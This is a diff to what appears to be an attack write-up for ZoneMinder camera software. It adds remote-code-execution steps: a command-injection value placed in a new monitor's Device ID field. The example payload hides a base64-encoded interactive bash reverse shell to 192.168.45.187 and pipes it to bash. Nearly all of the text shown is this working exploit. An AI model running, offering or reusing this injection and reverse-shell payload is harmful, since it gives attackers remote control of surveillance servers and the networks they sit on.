@@ -12,4 +12,5 @@ In a ZoneMinder installation.
 
 ## RCE
 - Press Add New Monitor
-- 
+- In the Device set device ID to `;[COMMAND];#`
+- E.g. `;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4Ny84MCAwPiYxCg=='|base64 -d|bash;#`
